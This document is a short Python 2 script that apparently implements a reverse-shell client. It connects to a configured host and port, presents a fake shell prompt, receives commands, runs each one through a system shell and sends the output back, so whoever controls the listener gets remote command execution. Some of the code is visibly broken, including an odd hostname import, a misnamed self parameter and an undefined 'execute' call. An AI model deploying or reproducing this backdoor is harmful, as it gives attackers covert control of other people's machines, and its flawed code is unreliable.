#coding=utf8
import subprocess
import sys
import hostname
import os
import time
from socket import *

HOST = 'localhost'
PORT = 8080
BUFSIZE = 1204
ADDR = (HOST, PORT)

class FlushFile(object):
    def __init__(self, f):
        self.f = f
    def write(self, x):
        self.f.write(x)
        self.f.flush()
 
sys.stdout = FlushFile(sys.__stdout__)

class operation():
    def __init__(self):
        self.host = hostname.hostname()
        self.username = os.getlogin()
        self.path = os.getcwd()
        self.start = self.username + '@' + \
        self.host + ':'+ self.path + '$' + ' '
    def command_return(second, command_from_client, cli):
        popen = subprocess.Popen([command_from_client],\
        shell = True, stdout = subprocess.PIPE)
        while True:
            next_line = popen.stdout.readline()
            if next_line == '' and popen.poll() != None:
                break
            cli.send(next_line)
        time.sleep(0.1)
        cli.send('#')
        time.sleep(0.1)
        print "over-------------"

    def conn_cli(self):
        self.tcpcli = socket(AF_INET, SOCK_STREAM)
        self.tcpcli.connect(ADDR)
        while True:
            head = self.tcpcli.send(self.start)
            command_from_ser = self.tcpcli.recv(BUFSIZE)
            self.command_return(command_from_ser, self.tcpcli)

    def display(self):
        while True:
            input = raw_input(self.start)
            if input == 'exit':
                break
            execute.command_return(input)

test1 = operation()
test1.conn_cli()
